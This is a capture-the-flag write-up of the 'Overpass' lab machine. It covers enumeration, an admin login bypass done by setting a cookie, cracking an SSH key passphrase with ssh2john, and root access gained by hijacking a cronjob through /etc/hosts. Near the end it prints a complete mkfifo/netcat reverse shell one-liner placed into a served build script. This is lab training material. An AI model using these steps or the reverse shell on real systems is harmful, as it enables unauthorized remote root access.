# Overpass

I started with a nmap scan:

![nmap.png](/images/reports/overpass/nmap.png)

I navigated to the website took a look at it, the only interesting thing on the main page is a comment regarding the security of the cryptograpy used. Next, I did a Gobuster scan to see if there are any other sub-pages:

![gobuster.png](/images/reports/overpass/gobuster.png)

The interesting one is the admin page, navigating to it we are met with a basic login form. I first tried to perform an SQLi but to no avail. Looking at the source code we can see the Javascript code for the login form. The interesting part in the code is the cookie that it is set after successful authentication, so maybe if we just set the cookie we might be able to login as the admin:

![code.png](/images/reports/overpass/code.png)

I went to the developer tools’ console, written the code line and changed the cookie to an empty string. After that I refreshed the page and got logged in successfully:

![key.png](/images/reports/overpass/key.png)

We can see a SSH key with which we can log into SSH as James. Like it says in above the SSH key, it is encrypted so when trying to SSH with the key I got asked to input the passphrase. So I converted the key to john using ssh2john and got the passphrase:

![john.png](/images/reports/overpass/john.png)

![login.png](/images/reports/overpass/login.png)

And we got access and the user flag.

Reading the todo.txt we see something regarding an automated script, this immediately lead me to cronjobs:

 

![todo.png](/images/reports/overpass/todo.png)

![cronjob.png](/images/reports/overpass/cronjob.png)

Researching this type of vulnerability I learned that the domain needs to be redirected to our IP, so the first thing I needed to do was to check if I can change the /etc/hosts file, which I could, so I changed the [localhost](http://localhost) IP to my host machine’s IP like this:

![hosts.png](/images/reports/overpass/hosts.png)

After changing the IP, on my machine I used the following commands:

`mkdir -p downloads/src`

`echo ‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.183.50 1234 >/tmp/f’ > downloads/src/buildscript.sh`

`python3 -m http.server 80`

Note to self: When trying the python server with another port other than 80 it didn’t work. 

In another terminal I used nc to catch the reverse shell. After a bit of patience I got the root shell back alongside the root flag.

![root.png](/images/reports/overpass/root.png)